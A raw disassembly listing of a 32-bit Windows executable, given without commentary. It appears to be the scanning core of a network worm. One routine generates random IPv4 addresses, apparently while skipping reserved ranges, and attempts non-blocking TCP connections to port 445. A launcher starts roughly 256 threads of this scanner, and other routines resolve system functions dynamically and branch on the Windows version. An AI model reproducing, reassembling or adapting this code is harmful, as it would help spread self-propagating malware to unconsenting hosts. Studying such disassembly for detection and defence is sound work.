  4023a1:	74 07                	je     0x4023aa
  4023a3:	50                   	push   %eax
  4023a4:	ff 15 24 8c 40 00    	call   *0x408c24
  4023aa:	5f                   	pop    %edi
  4023ab:	5d                   	pop    %ebp
  4023ac:	81 c4 e4 05 00 00    	add    $0x5e4,%esp
  4023b2:	c3                   	ret
  4023b3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023b7:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4023bb:	3b c7                	cmp    %edi,%eax
  4023bd:	7e da                	jle    0x402399
  4023bf:	8b 1d 48 70 40 00    	mov    0x407048,%ebx
  4023c5:	3b f7                	cmp    %edi,%esi
  4023c7:	74 d0                	je     0x402399
  4023c9:	8b 06                	mov    (%esi),%eax
  4023cb:	57                   	push   %edi
  4023cc:	57                   	push   %edi
  4023cd:	8d 94 24 14 01 00 00 	lea    0x114(%esp),%edx
  4023d4:	68 00 01 00 00       	push   $0x100
  4023d9:	52                   	push   %edx
  4023da:	6a ff                	push   $0xffffffff
  4023dc:	50                   	push   %eax
  4023dd:	57                   	push   %edi
  4023de:	57                   	push   %edi
  4023df:	ff d3                	call   *%ebx
  4023e1:	57                   	push   %edi
  4023e2:	8d 8c 24 10 01 00 00 	lea    0x110(%esp),%ecx
  4023e9:	55                   	push   %ebp
  4023ea:	51                   	push   %ecx
  4023eb:	e8 40 fc ff ff       	call   0x402030
  4023f0:	83 c4 0c             	add    $0xc,%esp
  4023f3:	85 c0                	test   %eax,%eax
  4023f5:	75 a2                	jne    0x402399
  4023f7:	8b 44 24 18          	mov    0x18(%esp),%eax
  4023fb:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4023ff:	83 c6 04             	add    $0x4,%esi
  402402:	40                   	inc    %eax
  402403:	3b c1                	cmp    %ecx,%eax
  402405:	89 44 24 18          	mov    %eax,0x18(%esp)
  402409:	7c ba                	jl     0x4023c5
  40240b:	eb 8c                	jmp    0x402399
  40240d:	90                   	nop
  40240e:	90                   	nop
  40240f:	90                   	nop
  402410:	81 ec 88 06 00 00    	sub    $0x688,%esp
  402416:	53                   	push   %ebx
  402417:	56                   	push   %esi
  402418:	57                   	push   %edi
  402419:	66 a1 4c 86 40 00    	mov    0x40864c,%ax
  40241f:	8a 0d 4e 86 40 00    	mov    0x40864e,%cl
  402425:	8b 15 48 86 40 00    	mov    0x408648,%edx
  40242b:	66 89 44 24 0c       	mov    %ax,0xc(%esp)
  402430:	a1 40 86 40 00       	mov    0x408640,%eax
  402435:	88 4c 24 0e          	mov    %cl,0xe(%esp)
  402439:	8a 0d 44 86 40 00    	mov    0x408644,%cl
  40243f:	89 54 24 14          	mov    %edx,0x14(%esp)
  402443:	66 8b 15 3c 86 40 00 	mov    0x40863c,%dx
  40244a:	89 44 24 18          	mov    %eax,0x18(%esp)
  40244e:	a0 3e 86 40 00       	mov    0x40863e,%al
  402453:	88 4c 24 1c          	mov    %cl,0x1c(%esp)
  402457:	8b 0d 34 86 40 00    	mov    0x408634,%ecx
  40245d:	66 89 54 24 10       	mov    %dx,0x10(%esp)
  402462:	66 8b 15 38 86 40 00 	mov    0x408638,%dx
  402469:	88 44 24 12          	mov    %al,0x12(%esp)
  40246d:	a0 3a 86 40 00       	mov    0x40863a,%al
  402472:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  402476:	8b 0d 28 86 40 00    	mov    0x408628,%ecx
  40247c:	66 89 54 24 24       	mov    %dx,0x24(%esp)
  402481:	8b 15 2c 86 40 00    	mov    0x40862c,%edx
  402487:	88 44 24 26          	mov    %al,0x26(%esp)
  40248b:	66 a1 30 86 40 00    	mov    0x408630,%ax
  402491:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  402495:	8a 0d 32 86 40 00    	mov    0x408632,%cl
  40249b:	89 54 24 48          	mov    %edx,0x48(%esp)
  40249f:	8b 15 20 86 40 00    	mov    0x408620,%edx
  4024a5:	66 89 44 24 4c       	mov    %ax,0x4c(%esp)
  4024aa:	a1 24 86 40 00       	mov    0x408624,%eax
  4024af:	88 4c 24 4e          	mov    %cl,0x4e(%esp)
  4024b3:	8b 0d 18 86 40 00    	mov    0x408618,%ecx
  4024b9:	89 54 24 74          	mov    %edx,0x74(%esp)
  4024bd:	66 8b 15 1c 86 40 00 	mov    0x40861c,%dx
  4024c4:	89 44 24 78          	mov    %eax,0x78(%esp)
  4024c8:	a1 10 86 40 00       	mov    0x408610,%eax
  4024cd:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  4024d1:	66 8b 0d 14 86 40 00 	mov    0x408614,%cx
  4024d8:	66 89 54 24 3c       	mov    %dx,0x3c(%esp)
  4024dd:	8b 15 0c 86 40 00    	mov    0x40860c,%edx
  4024e3:	89 44 24 28          	mov    %eax,0x28(%esp)
  4024e7:	a1 08 86 40 00       	mov    0x408608,%eax
  4024ec:	66 89 4c 24 2c       	mov    %cx,0x2c(%esp)
  4024f1:	8b 0d fc 85 40 00    	mov    0x4085fc,%ecx
  4024f7:	89 54 24 34          	mov    %edx,0x34(%esp)
  4024fb:	8b 15 00 86 40 00    	mov    0x408600,%edx
  402501:	89 44 24 40          	mov    %eax,0x40(%esp)
  402505:	a0 04 86 40 00       	mov    0x408604,%al
  40250a:	89 4c 24 50          	mov    %ecx,0x50(%esp)
  40250e:	8b 0d f0 85 40 00    	mov    0x4085f0,%ecx
  402514:	89 54 24 54          	mov    %edx,0x54(%esp)
  402518:	8b 15 f4 85 40 00    	mov    0x4085f4,%edx
  40251e:	88 44 24 58          	mov    %al,0x58(%esp)
  402522:	a0 f8 85 40 00       	mov    0x4085f8,%al
  402527:	89 4c 24 5c          	mov    %ecx,0x5c(%esp)
  40252b:	8b 0d e4 85 40 00    	mov    0x4085e4,%ecx
  402531:	89 54 24 60          	mov    %edx,0x60(%esp)
  402535:	8b 15 e8 85 40 00    	mov    0x4085e8,%edx
  40253b:	88 44 24 64          	mov    %al,0x64(%esp)
  40253f:	a0 ec 85 40 00       	mov    0x4085ec,%al
  402544:	89 4c 24 68          	mov    %ecx,0x68(%esp)
  402548:	8b 0d e0 85 40 00    	mov    0x4085e0,%ecx
  40254e:	89 54 24 6c          	mov    %edx,0x6c(%esp)
  402552:	8b 35 38 71 40 00    	mov    0x407138,%esi
  402558:	88 44 24 70          	mov    %al,0x70(%esp)
  40255c:	8d 54 24 20          	lea    0x20(%esp),%edx
  402560:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  402564:	8d 44 24 34          	lea    0x34(%esp),%eax
  402568:	52                   	push   %edx
  402569:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40256d:	50                   	push   %eax
  40256e:	51                   	push   %ecx
  40256f:	8d 94 24 98 04 00 00 	lea    0x498(%esp),%edx
  402576:	68 d8 85 40 00       	push   $0x4085d8
  40257b:	52                   	push   %edx
  40257c:	ff d6                	call   *%esi
  40257e:	8d 44 24 24          	lea    0x24(%esp),%eax
  402582:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  402586:	50                   	push   %eax
  402587:	8d 54 24 24          	lea    0x24(%esp),%edx
  40258b:	51                   	push   %ecx
  40258c:	52                   	push   %edx
  40258d:	8d 84 24 a4 02 00 00 	lea    0x2a4(%esp),%eax
  402594:	68 d8 85 40 00       	push   $0x4085d8
  402599:	50                   	push   %eax
  40259a:	ff d6                	call   *%esi
  40259c:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  4025a0:	8d 54 24 78          	lea    0x78(%esp),%edx
  4025a4:	51                   	push   %ecx
  4025a5:	8d 44 24 44          	lea    0x44(%esp),%eax
  4025a9:	52                   	push   %edx
  4025aa:	50                   	push   %eax
  4025ab:	8d 8c 24 b0 00 00 00 	lea    0xb0(%esp),%ecx
  4025b2:	68 d8 85 40 00       	push   $0x4085d8
  4025b7:	51                   	push   %ecx
  4025b8:	ff d6                	call   *%esi
  4025ba:	8d 94 24 b0 00 00 00 	lea    0xb0(%esp),%edx
  4025c1:	8d 84 24 98 00 00 00 	lea    0x98(%esp),%eax
  4025c8:	52                   	push   %edx
  4025c9:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  4025cd:	50                   	push   %eax
  4025ce:	51                   	push   %ecx
  4025cf:	8d 94 24 c8 01 00 00 	lea    0x1c8(%esp),%edx
  4025d6:	68 d8 85 40 00       	push   $0x4085d8
  4025db:	52                   	push   %edx
  4025dc:	ff d6                	call   *%esi
  4025de:	83 c4 50             	add    $0x50,%esp
  4025e1:	8d 44 24 38          	lea    0x38(%esp),%eax
  4025e5:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  4025e9:	8d 54 24 14          	lea    0x14(%esp),%edx
  4025ed:	50                   	push   %eax
  4025ee:	51                   	push   %ecx
  4025ef:	52                   	push   %edx
  4025f0:	8d 84 24 94 03 00 00 	lea    0x394(%esp),%eax
  4025f7:	68 d8 85 40 00       	push   $0x4085d8
  4025fc:	50                   	push   %eax
  4025fd:	ff d6                	call   *%esi
  4025ff:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  402603:	8d 54 24 44          	lea    0x44(%esp),%edx
  402607:	51                   	push   %ecx
  402608:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40260c:	52                   	push   %edx
  40260d:	50                   	push   %eax
  40260e:	8d 8c 24 b0 05 00 00 	lea    0x5b0(%esp),%ecx
  402615:	68 d8 85 40 00       	push   $0x4085d8
  40261a:	51                   	push   %ecx
  40261b:	ff d6                	call   *%esi
  40261d:	8b 3d 58 70 40 00    	mov    0x407058,%edi
  402623:	83 c4 28             	add    $0x28,%esp
  402626:	8d 94 24 8c 04 00 00 	lea    0x48c(%esp),%edx
  40262d:	52                   	push   %edx
  40262e:	ff d7                	call   *%edi
  402630:	8b f0                	mov    %eax,%esi
  402632:	8d 84 24 84 02 00 00 	lea    0x284(%esp),%eax
  402639:	50                   	push   %eax
  40263a:	ff d7                	call   *%edi
  40263c:	83 fe ff             	cmp    $0xffffffff,%esi
  40263f:	8b d8                	mov    %eax,%ebx
  402641:	74 6e                	je     0x4026b1
  402643:	83 fb ff             	cmp    $0xffffffff,%ebx
  402646:	74 69                	je     0x4026b1
  402648:	8b 3d a0 70 40 00    	mov    0x4070a0,%edi
  40264e:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  402652:	51                   	push   %ecx
  402653:	53                   	push   %ebx
  402654:	ff d7                	call   *%edi
  402656:	85 c0                	test   %eax,%eax
  402658:	a3 20 8c 40 00       	mov    %eax,0x408c20
  40265d:	74 4b                	je     0x4026aa
  40265f:	8d 94 24 80 01 00 00 	lea    0x180(%esp),%edx
  402666:	52                   	push   %edx
  402667:	53                   	push   %ebx
  402668:	ff d7                	call   *%edi
  40266a:	85 c0                	test   %eax,%eax
  40266c:	a3 34 92 40 00       	mov    %eax,0x409234
  402671:	74 37                	je     0x4026aa
  402673:	8d 84 24 88 03 00 00 	lea    0x388(%esp),%eax
  40267a:	50                   	push   %eax
  40267b:	56                   	push   %esi
  40267c:	ff d7                	call   *%edi
  40267e:	85 c0                	test   %eax,%eax
  402680:	a3 24 8c 40 00       	mov    %eax,0x408c24
  402685:	74 23                	je     0x4026aa
  402687:	8d 8c 24 90 05 00 00 	lea    0x590(%esp),%ecx
  40268e:	51                   	push   %ecx
  40268f:	56                   	push   %esi
  402690:	ff d7                	call   *%edi
  402692:	85 c0                	test   %eax,%eax
  402694:	a3 38 96 40 00       	mov    %eax,0x409638
  402699:	74 0f                	je     0x4026aa
  40269b:	5f                   	pop    %edi
  40269c:	5e                   	pop    %esi
  40269d:	b8 01 00 00 00       	mov    $0x1,%eax
  4026a2:	5b                   	pop    %ebx
  4026a3:	81 c4 88 06 00 00    	add    $0x688,%esp
  4026a9:	c3                   	ret
  4026aa:	56                   	push   %esi
  4026ab:	ff 15 50 70 40 00    	call   *0x407050
  4026b1:	5f                   	pop    %edi
  4026b2:	5e                   	pop    %esi
  4026b3:	33 c0                	xor    %eax,%eax
  4026b5:	5b                   	pop    %ebx
  4026b6:	81 c4 88 06 00 00    	add    $0x688,%esp
  4026bc:	c3                   	ret
  4026bd:	90                   	nop
  4026be:	90                   	nop
  4026bf:	90                   	nop
  4026c0:	81 ec 94 05 00 00    	sub    $0x594,%esp
  4026c6:	53                   	push   %ebx
  4026c7:	56                   	push   %esi
  4026c8:	8d 84 24 0c 04 00 00 	lea    0x40c(%esp),%eax
  4026cf:	57                   	push   %edi
  4026d0:	50                   	push   %eax
  4026d1:	68 02 02 00 00       	push   $0x202
  4026d6:	c7 44 24 14 04 01 00 	movl   $0x104,0x14(%esp)
  4026dd:	00 
  4026de:	e8 af 0f 00 00       	call   0x403692
  4026e3:	85 c0                	test   %eax,%eax
  4026e5:	0f 85 fa 01 00 00    	jne    0x4028e5
  4026eb:	e8 20 fd ff ff       	call   0x402410
  4026f0:	85 c0                	test   %eax,%eax
  4026f2:	0f 84 ed 01 00 00    	je     0x4028e5
  4026f8:	68 04 01 00 00       	push   $0x104
  4026fd:	68 28 8c 40 00       	push   $0x408c28
  402702:	6a 00                	push   $0x0
  402704:	ff 15 60 70 40 00    	call   *0x407060
  40270a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40270e:	8d 54 24 10          	lea    0x10(%esp),%edx
  402712:	51                   	push   %ecx
  402713:	52                   	push   %edx
  402714:	ff 15 24 70 40 00    	call   *0x407024
  40271a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40271e:	50                   	push   %eax
  40271f:	ff 15 3c 71 40 00    	call   *0x40713c
  402725:	68 9c 86 40 00       	push   $0x40869c
  40272a:	e8 a1 ec ff ff       	call   0x4013d0
  40272f:	a3 40 96 40 00       	mov    %eax,0x409640
  402734:	83 c4 08             	add    $0x8,%esp
  402737:	be 94 86 40 00       	mov    $0x408694,%esi
  40273c:	8d 44 24 10          	lea    0x10(%esp),%eax
  402740:	8a 10                	mov    (%eax),%dl
  402742:	8a 1e                	mov    (%esi),%bl
  402744:	8a ca                	mov    %dl,%cl
  402746:	3a d3                	cmp    %bl,%dl
  402748:	75 1e                	jne    0x402768
  40274a:	84 c9                	test   %cl,%cl
  40274c:	74 16                	je     0x402764
  40274e:	8a 50 01             	mov    0x1(%eax),%dl
  402751:	8a 5e 01             	mov    0x1(%esi),%bl
  402754:	8a ca                	mov    %dl,%cl
  402756:	3a d3                	cmp    %bl,%dl
  402758:	75 0e                	jne    0x402768
  40275a:	83 c0 02             	add    $0x2,%eax
  40275d:	83 c6 02             	add    $0x2,%esi
  402760:	84 c9                	test   %cl,%cl
  402762:	75 dc                	jne    0x402740
  402764:	33 c0                	xor    %eax,%eax
  402766:	eb 05                	jmp    0x40276d
  402768:	1b c0                	sbb    %eax,%eax
  40276a:	83 d8 ff             	sbb    $0xffffffff,%eax
  40276d:	85 c0                	test   %eax,%eax
  40276f:	0f 85 40 01 00 00    	jne    0x4028b5
  402775:	e8 26 f4 ff ff       	call   0x401ba0
  40277a:	e8 b1 f3 ff ff       	call   0x401b30
  40277f:	e8 bc e8 ff ff       	call   0x401040
  402784:	bf 88 86 40 00       	mov    $0x408688,%edi
  402789:	83 c9 ff             	or     $0xffffffff,%ecx
  40278c:	33 c0                	xor    %eax,%eax
  40278e:	8d 54 24 10          	lea    0x10(%esp),%edx
  402792:	f2 ae                	repnz scas %es:(%edi),%al
  402794:	f7 d1                	not    %ecx
  402796:	2b f9                	sub    %ecx,%edi
  402798:	8b c1                	mov    %ecx,%eax
  40279a:	8b f7                	mov    %edi,%esi
  40279c:	8b fa                	mov    %edx,%edi
  40279e:	8d 54 24 10          	lea    0x10(%esp),%edx
  4027a2:	c1 e9 02             	shr    $0x2,%ecx
  4027a5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4027a7:	8b c8                	mov    %eax,%ecx
  4027a9:	33 c0                	xor    %eax,%eax
  4027ab:	83 e1 03             	and    $0x3,%ecx
  4027ae:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4027b0:	bf 54 96 40 00       	mov    $0x409654,%edi
  4027b5:	83 c9 ff             	or     $0xffffffff,%ecx
  4027b8:	f2 ae                	repnz scas %es:(%edi),%al
  4027ba:	f7 d1                	not    %ecx
  4027bc:	2b f9                	sub    %ecx,%edi
  4027be:	8b f7                	mov    %edi,%esi
  4027c0:	8b d9                	mov    %ecx,%ebx
  4027c2:	8b fa                	mov    %edx,%edi
  4027c4:	83 c9 ff             	or     $0xffffffff,%ecx
  4027c7:	f2 ae                	repnz scas %es:(%edi),%al
  4027c9:	8b cb                	mov    %ebx,%ecx
  4027cb:	4f                   	dec    %edi
  4027cc:	c1 e9 02             	shr    $0x2,%ecx
  4027cf:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4027d1:	8b cb                	mov    %ebx,%ecx
  4027d3:	83 e1 03             	and    $0x3,%ecx
  4027d6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4027d8:	ff 15 5c 70 40 00    	call   *0x40705c
  4027de:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4027e2:	25 ff ff 00 00       	and    $0xffff,%eax
  4027e7:	83 f8 06             	cmp    $0x6,%eax
  4027ea:	7f 2b                	jg     0x402817
  4027ec:	74 1e                	je     0x40280c
  4027ee:	83 e8 04             	sub    $0x4,%eax
  4027f1:	74 0e                	je     0x402801
  4027f3:	48                   	dec    %eax
  4027f4:	75 2f                	jne    0x402825
  4027f6:	8d 54 24 10          	lea    0x10(%esp),%edx
  4027fa:	bf 80 86 40 00       	mov    $0x408680,%edi
  4027ff:	eb 43                	jmp    0x402844
  402801:	8d 54 24 10          	lea    0x10(%esp),%edx
  402805:	bf 78 86 40 00       	mov    $0x408678,%edi
  40280a:	eb 38                	jmp    0x402844
  40280c:	8d 54 24 10          	lea    0x10(%esp),%edx
  402810:	bf 6c 86 40 00       	mov    $0x40866c,%edi
  402815:	eb 2d                	jmp    0x402844
  402817:	3d 05 01 00 00       	cmp    $0x105,%eax
  40281c:	74 1d                	je     0x40283b
  40281e:	3d 05 02 00 00       	cmp    $0x205,%eax
  402823:	74 0b                	je     0x402830
  402825:	8d 54 24 10          	lea    0x10(%esp),%edx
  402829:	bf 64 86 40 00       	mov    $0x408664,%edi
  40282e:	eb 14                	jmp    0x402844
  402830:	8d 54 24 10          	lea    0x10(%esp),%edx
  402834:	bf 5c 86 40 00       	mov    $0x40865c,%edi
  402839:	eb 09                	jmp    0x402844
  40283b:	8d 54 24 10          	lea    0x10(%esp),%edx
  40283f:	bf 54 86 40 00       	mov    $0x408654,%edi
  402844:	83 c9 ff             	or     $0xffffffff,%ecx
  402847:	33 c0                	xor    %eax,%eax
  402849:	f2 ae                	repnz scas %es:(%edi),%al
  40284b:	f7 d1                	not    %ecx
  40284d:	2b f9                	sub    %ecx,%edi
  40284f:	68 1c 82 40 00       	push   $0x40821c
  402854:	8b f7                	mov    %edi,%esi
  402856:	8b d9                	mov    %ecx,%ebx
  402858:	8b fa                	mov    %edx,%edi
  40285a:	83 c9 ff             	or     $0xffffffff,%ecx
  40285d:	f2 ae                	repnz scas %es:(%edi),%al
  40285f:	8b cb                	mov    %ebx,%ecx
  402861:	4f                   	dec    %edi
  402862:	c1 e9 02             	shr    $0x2,%ecx
  402865:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402867:	8b cb                	mov    %ebx,%ecx
  402869:	8d 54 24 14          	lea    0x14(%esp),%edx
  40286d:	83 e1 03             	and    $0x3,%ecx
  402870:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402872:	bf 50 86 40 00       	mov    $0x408650,%edi
  402877:	83 c9 ff             	or     $0xffffffff,%ecx
  40287a:	f2 ae                	repnz scas %es:(%edi),%al
  40287c:	f7 d1                	not    %ecx
  40287e:	2b f9                	sub    %ecx,%edi
  402880:	8b f7                	mov    %edi,%esi
  402882:	8b d9                	mov    %ecx,%ebx
  402884:	8b fa                	mov    %edx,%edi
  402886:	83 c9 ff             	or     $0xffffffff,%ecx
  402889:	f2 ae                	repnz scas %es:(%edi),%al
  40288b:	8b cb                	mov    %ebx,%ecx
  40288d:	4f                   	dec    %edi
  40288e:	c1 e9 02             	shr    $0x2,%ecx
  402891:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402893:	8b cb                	mov    %ebx,%ecx
  402895:	8d 44 24 14          	lea    0x14(%esp),%eax
  402899:	83 e1 03             	and    $0x3,%ecx
  40289c:	50                   	push   %eax
  40289d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40289f:	e8 8c eb ff ff       	call   0x401430
  4028a4:	83 c4 08             	add    $0x8,%esp
  4028a7:	33 c0                	xor    %eax,%eax
  4028a9:	5f                   	pop    %edi
  4028aa:	5e                   	pop    %esi
  4028ab:	5b                   	pop    %ebx
  4028ac:	81 c4 94 05 00 00    	add    $0x594,%esp
  4028b2:	c2 10 00             	ret    $0x10
  4028b5:	8b 3d 2c 71 40 00    	mov    0x40712c,%edi
  4028bb:	8b 35 44 70 40 00    	mov    0x407044,%esi
  4028c1:	bb 00 01 00 00       	mov    $0x100,%ebx
  4028c6:	6a 00                	push   $0x0
  4028c8:	6a 00                	push   $0x0
  4028ca:	6a 00                	push   $0x0
  4028cc:	68 00 29 40 00       	push   $0x402900
  4028d1:	6a 00                	push   $0x0
  4028d3:	6a 00                	push   $0x0
  4028d5:	ff d7                	call   *%edi
  4028d7:	83 c4 18             	add    $0x18,%esp
  4028da:	6a 32                	push   $0x32
  4028dc:	ff d6                	call   *%esi
  4028de:	4b                   	dec    %ebx
  4028df:	75 e5                	jne    0x4028c6
  4028e1:	6a ff                	push   $0xffffffff
  4028e3:	ff d6                	call   *%esi
  4028e5:	5f                   	pop    %edi
  4028e6:	5e                   	pop    %esi
  4028e7:	33 c0                	xor    %eax,%eax
  4028e9:	5b                   	pop    %ebx
  4028ea:	81 c4 94 05 00 00    	add    $0x594,%esp
  4028f0:	c2 10 00             	ret    $0x10
  4028f3:	90                   	nop
  4028f4:	90                   	nop
  4028f5:	90                   	nop
  4028f6:	90                   	nop
  4028f7:	90                   	nop
  4028f8:	90                   	nop
  4028f9:	90                   	nop
  4028fa:	90                   	nop
  4028fb:	90                   	nop
  4028fc:	90                   	nop
  4028fd:	90                   	nop
  4028fe:	90                   	nop
  4028ff:	90                   	nop
  402900:	81 ec 38 02 00 00    	sub    $0x238,%esp
  402906:	53                   	push   %ebx
  402907:	8b 1d 9c 70 40 00    	mov    0x40709c,%ebx
  40290d:	55                   	push   %ebp
  40290e:	56                   	push   %esi
  40290f:	b8 01 00 00 00       	mov    $0x1,%eax
  402914:	57                   	push   %edi
  402915:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402919:	89 44 24 18          	mov    %eax,0x18(%esp)
  40291d:	89 44 24 14          	mov    %eax,0x14(%esp)
  402921:	ff d3                	call   *%ebx
  402923:	89 44 24 24          	mov    %eax,0x24(%esp)
  402927:	ff d3                	call   *%ebx
  402929:	50                   	push   %eax
  40292a:	ff 15 30 71 40 00    	call   *0x407130
  402930:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  402934:	83 c4 04             	add    $0x4,%esp
  402937:	ff d3                	call   *%ebx
  402939:	8b 74 24 24          	mov    0x24(%esp),%esi
  40293d:	2b c6                	sub    %esi,%eax
  40293f:	3d 80 ee 36 00       	cmp    $0x36ee80,%eax
  402944:	76 08                	jbe    0x40294e
  402946:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  40294d:	00 
  40294e:	ff d3                	call   *%ebx
  402950:	2b c6                	sub    %esi,%eax
  402952:	3d 80 4f 12 00       	cmp    $0x124f80,%eax
  402957:	76 08                	jbe    0x402961
  402959:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  402960:	00 
  402961:	8b 44 24 18          	mov    0x18(%esp),%eax
  402965:	85 c0                	test   %eax,%eax
  402967:	74 21                	je     0x40298a
  402969:	ff d3                	call   *%ebx
  40296b:	8b 35 34 71 40 00    	mov    0x407134,%esi
  402971:	8b f8                	mov    %eax,%edi
  402973:	81 e7 ff 0f 00 00    	and    $0xfff,%edi
  402979:	ff d6                	call   *%esi
  40297b:	03 c7                	add    %edi,%eax
  40297d:	33 d2                	xor    %edx,%edx
  40297f:	b9 ff 00 00 00       	mov    $0xff,%ecx
  402984:	f7 f1                	div    %ecx
  402986:	8b ea                	mov    %edx,%ebp
  402988:	eb 06                	jmp    0x402990
  40298a:	8b 35 34 71 40 00    	mov    0x407134,%esi
  402990:	83 fd 14             	cmp    $0x14,%ebp
  402993:	7c 0d                	jl     0x4029a2
  402995:	81 fd f0 00 00 00    	cmp    $0xf0,%ebp
  40299b:	7f 05                	jg     0x4029a2
  40299d:	83 fd 7f             	cmp    $0x7f,%ebp
  4029a0:	75 05                	jne    0x4029a7
  4029a2:	bd d2 00 00 00       	mov    $0xd2,%ebp
  4029a7:	8b 44 24 14          	mov    0x14(%esp),%eax
  4029ab:	85 c0                	test   %eax,%eax
  4029ad:	74 1b                	je     0x4029ca
  4029af:	ff d3                	call   *%ebx
  4029b1:	8b f8                	mov    %eax,%edi
  4029b3:	81 e7 ff 0f 00 00    	and    $0xfff,%edi
  4029b9:	ff d6                	call   *%esi
  4029bb:	03 c7                	add    %edi,%eax
  4029bd:	33 d2                	xor    %edx,%edx
  4029bf:	b9 ff 00 00 00       	mov    $0xff,%ecx
  4029c4:	f7 f1                	div    %ecx
  4029c6:	89 54 24 20          	mov    %edx,0x20(%esp)
  4029ca:	ff d3                	call   *%ebx
  4029cc:	8b f8                	mov    %eax,%edi
  4029ce:	81 e7 ff 0f 00 00    	and    $0xfff,%edi
  4029d4:	ff d6                	call   *%esi
  4029d6:	03 c7                	add    %edi,%eax
  4029d8:	33 d2                	xor    %edx,%edx
  4029da:	b9 ff 00 00 00       	mov    $0xff,%ecx
  4029df:	f7 f1                	div    %ecx
  4029e1:	8b fa                	mov    %edx,%edi
  4029e3:	ff d3                	call   *%ebx
  4029e5:	8b d0                	mov    %eax,%edx
  4029e7:	81 e2 ff 0f 00 00    	and    $0xfff,%edx
  4029ed:	89 54 24 10          	mov    %edx,0x10(%esp)
  4029f1:	ff d6                	call   *%esi
  4029f3:	8b 54 24 10          	mov    0x10(%esp),%edx
  4029f7:	b9 ff 00 00 00       	mov    $0xff,%ecx
  4029fc:	03 c2                	add    %edx,%eax
  4029fe:	33 d2                	xor    %edx,%edx
  402a00:	f7 f1                	div    %ecx
  402a02:	8d 44 24 40          	lea    0x40(%esp),%eax
  402a06:	52                   	push   %edx
  402a07:	8b 54 24 24          	mov    0x24(%esp),%edx
  402a0b:	57                   	push   %edi
  402a0c:	52                   	push   %edx
  402a0d:	55                   	push   %ebp
  402a0e:	68 a8 86 40 00       	push   $0x4086a8
  402a13:	50                   	push   %eax
  402a14:	ff 15 38 71 40 00    	call   *0x407138
  402a1a:	83 c4 18             	add    $0x18,%esp
  402a1d:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  402a21:	51                   	push   %ecx
  402a22:	e8 71 0c 00 00       	call   0x403698
  402a27:	68 bd 01 00 00       	push   $0x1bd
  402a2c:	89 44 24 38          	mov    %eax,0x38(%esp)
  402a30:	66 c7 44 24 34 02 00 	movw   $0x2,0x34(%esp)
  402a37:	e8 3e 0c 00 00       	call   0x40367a
  402a3c:	6a 00                	push   $0x0
  402a3e:	6a 01                	push   $0x1
  402a40:	6a 02                	push   $0x2
  402a42:	66 89 44 24 3e       	mov    %ax,0x3e(%esp)
  402a47:	e8 28 0c 00 00       	call   0x403674
  402a4c:	8b f0                	mov    %eax,%esi
  402a4e:	83 fe ff             	cmp    $0xffffffff,%esi
  402a51:	75 0d                	jne    0x402a60
  402a53:	6a 64                	push   $0x64
  402a55:	ff 15 44 70 40 00    	call   *0x407044
  402a5b:	e9 d7 fe ff ff       	jmp    0x402937
  402a60:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402a64:	52                   	push   %edx
  402a65:	68 7e 66 04 80       	push   $0x8004667e
  402a6a:	56                   	push   %esi
  402a6b:	e8 fe 0b 00 00       	call   0x40366e
  402a70:	6a 32                	push   $0x32
  402a72:	89 b4 24 4c 01 00 00 	mov    %esi,0x14c(%esp)
  402a79:	c7 84 24 48 01 00 00 	movl   $0x1,0x148(%esp)
  402a80:	01 00 00 00 
  402a84:	c7 44 24 2c 03 00 00 	movl   $0x3,0x2c(%esp)
  402a8b:	00 
  402a8c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  402a93:	00 
  402a94:	ff 15 44 70 40 00    	call   *0x407044
  402a9a:	8d 44 24 30          	lea    0x30(%esp),%eax
  402a9e:	6a 10                	push   $0x10
  402aa0:	50                   	push   %eax
  402aa1:	56                   	push   %esi
  402aa2:	e8 c1 0b 00 00       	call   0x403668
  402aa7:	e8 d4 0b 00 00       	call   0x403680
  402aac:	3d 33 27 00 00       	cmp    $0x2733,%eax
  402ab1:	74 13                	je     0x402ac6
  402ab3:	56                   	push   %esi
  402ab4:	e8 a3 0b 00 00       	call   0x40365c
  402ab9:	6a 64                	push   $0x64
  402abb:	ff 15 44 70 40 00    	call   *0x407044
  402ac1:	e9 71 fe ff ff       	jmp    0x402937
  402ac6:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  402aca:	8d 94 24 44 01 00 00 	lea    0x144(%esp),%edx
  402ad1:	51                   	push   %ecx
  402ad2:	6a 00                	push   $0x0
  402ad4:	52                   	push   %edx
  402ad5:	6a 00                	push   $0x0
  402ad7:	6a 00                	push   $0x0
  402ad9:	e8 84 0b 00 00       	call   0x403662
  402ade:	56                   	push   %esi
  402adf:	89 44 24 14          	mov    %eax,0x14(%esp)
  402ae3:	e8 74 0b 00 00       	call   0x40365c
  402ae8:	8b 44 24 10          	mov    0x10(%esp),%eax
